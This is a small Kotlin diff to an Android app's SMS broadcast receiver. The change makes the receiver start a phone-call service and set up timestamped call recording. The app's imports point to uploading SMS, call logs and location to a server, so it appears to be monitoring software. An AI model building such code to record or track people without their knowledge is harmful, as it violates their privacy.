@@ -7,6 +7,7 @@ import an.xuan.tong.historycontact.api.model.CallLogServer
 import an.xuan.tong.historycontact.api.model.PowerAndInternet
 import an.xuan.tong.historycontact.api.model.SmsSendServer
 import an.xuan.tong.historycontact.call.CallRecord
+import an.xuan.tong.historycontact.call.receiver.PhoneCallReceiver
 import an.xuan.tong.historycontact.location.LocationService
 import an.xuan.tong.historycontact.realm.RealmUtils
 import an.xuan.tong.historycontact.smsradar.SmsRadarService
@@ -53,6 +54,13 @@ class SMSreceiver : BroadcastReceiver() {
                 context.startService(intentSms)
             }
             //Call
+            val pushIntent = Intent(context, PhoneCallReceiver::class.java)
+            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
+                context.startForegroundService(pushIntent)
+            } else {
+                context.startService(pushIntent)
+            }
+
             var callRecord = CallRecord.Builder(context)
                     .setRecordFileName("Record_" + SimpleDateFormat("ddMMyyyyHHmmss", Locale.US).format(Date()))
                     .setRecordDirName("Historycontact")
